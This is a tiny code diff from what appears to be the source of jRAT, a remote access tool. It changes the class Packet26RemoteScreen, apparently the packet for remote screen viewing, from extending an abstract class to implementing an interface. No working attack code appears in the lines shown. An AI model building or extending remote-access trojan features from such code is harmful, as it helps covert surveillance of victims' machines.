@@ -2,7 +2,7 @@ package jrat.client.packets.outgoing;
 
 import jrat.client.Connection;
 
-public class Packet26RemoteScreen extends AbstractOutgoingPacket {
+public class Packet26RemoteScreen implements OutgoingPacket {
 
 	private int chunkWidth;
 	private int chunkHeight;
